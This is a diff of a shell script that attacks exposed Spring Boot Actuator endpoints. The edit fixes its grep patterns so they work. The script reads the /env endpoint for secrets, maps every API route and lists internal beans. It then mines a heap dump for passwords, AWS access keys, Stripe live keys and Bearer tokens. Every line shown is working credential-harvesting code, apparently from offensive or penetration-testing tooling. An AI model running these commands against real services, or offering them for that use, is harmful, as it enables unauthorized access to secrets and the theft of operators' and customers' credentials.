@@ -70,7 +70,7 @@ done
 curl --max-time 30 --connect-timeout 10 -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20
 
 # Get all endpoint mappings (full API surface)
-curl --max-time 30 --connect-timeout 10 -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -Eo '"pattern":"\K[^"]+' | sort
+curl --max-time 30 --connect-timeout 10 -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -Po '"pattern":"\K[^"]+' | sort
 
 # Get Spring beans (lists all registered beans, reveals internal architecture)
 curl --max-time 30 --connect-timeout 10 -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
@@ -90,7 +90,7 @@ strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|be
   grep -v "^[a-z_]" | sort -u | head -50
 
 # More targeted extraction
-strings /tmp/heapdump.hprof | grep -Eo "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
+strings /tmp/heapdump.hprof | grep -Po "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
 strings /tmp/heapdump.hprof | grep -Eo "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
 strings /tmp/heapdump.hprof | grep -Eo "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
 strings /tmp/heapdump.hprof | grep -Eo "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens
